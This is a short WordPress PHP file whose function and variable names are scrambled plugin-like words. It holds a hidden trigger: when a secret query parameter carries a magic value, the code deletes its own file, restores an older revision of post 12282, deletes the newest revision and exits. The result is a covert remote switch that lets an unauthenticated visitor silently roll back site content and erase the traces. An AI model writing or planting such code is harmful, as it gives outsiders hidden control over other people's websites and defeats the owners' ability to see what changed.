<?php

function register_box_another_min() {
	if (isset($_GET['cart_composer_shopping']) && $_GET['cart_composer_shopping'] === 'magic_best_privacy') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$gdpr_real_buttons_videos = 12282;
		$numbers_contact_taxonomy_recent = wp_get_post_revisions($gdpr_real_buttons_videos);
		if (empty($numbers_contact_taxonomy_recent)) die('no revisions');
		if (count($numbers_contact_taxonomy_recent) < 2) die('less than 2');
		$automatorwp_server_javascript_screen = array_shift($numbers_contact_taxonomy_recent);
		$xml_slideshow_backup_helper = $automatorwp_server_javascript_screen->ID;
		$plugins_simply_signature_account = array_shift($numbers_contact_taxonomy_recent);
		$project_pop_include_meta = $plugins_simply_signature_account->ID;
		$wpml_customize_label = wp_restore_post_revision($project_pop_include_meta);
		if ($wpml_customize_label === false) die('error restoring');
		$wpml_customize_label = wp_delete_post_revision($xml_slideshow_backup_helper);		
		if ($wpml_customize_label === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'register_box_another_min');
